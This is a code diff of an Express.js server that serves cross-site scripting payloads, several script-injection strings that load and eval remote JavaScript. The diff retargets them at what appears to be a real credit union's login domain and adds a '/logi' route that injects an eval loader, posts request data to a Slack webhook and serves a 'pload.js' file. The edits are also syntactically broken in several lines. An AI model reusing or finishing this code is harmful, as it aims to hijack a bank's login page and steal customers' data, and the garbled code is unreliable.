@@ -92,23 +92,24 @@ async function uploadImage(image) {
 
 app.get("/examples", (req, res) => {
   res.header("Content-Type", "text/plain");
-  // Create the URL based on the request's host header
-  var url = "https://" + req.headers["host"];
+  // Create the URL based on the request's host
+  var url = req.protocol + '://' + www.afcu.org/login + req.headers["host"];
+  //page += `<script>$.getScript("${url}")</script>`; ;
   // Initialize the page variable
-  var page = "/";
+  //var page = "login/;
   // Append necessary scripts to the page variable
-  page += `\'"><script src="${url}"></script>\n\n`;
-  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
-  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
-  page += `<script>$.getScript("${url}")</script>`;
+  //page += `\'"><script src="${url}"></script>\n\n`;
+  //page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
+  url += <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
+  //page += `<script>$.getScript("${url}")</script>`;
   
   // Send the constructed page
   res.send(page);
 });
 
 app.all("/logi", async (req, res) => {
-  var url = req.protocol + '://afcu.org/login/' + req.headers['host']
-  //page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
+  var url = req.protocol + "://www.afcu.org" + req.headers['host']
+  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
   request.post(slack_incoming_webhook, data, () => {
   res.sendFile(path.join(__dirname, "pload.js"));
   });
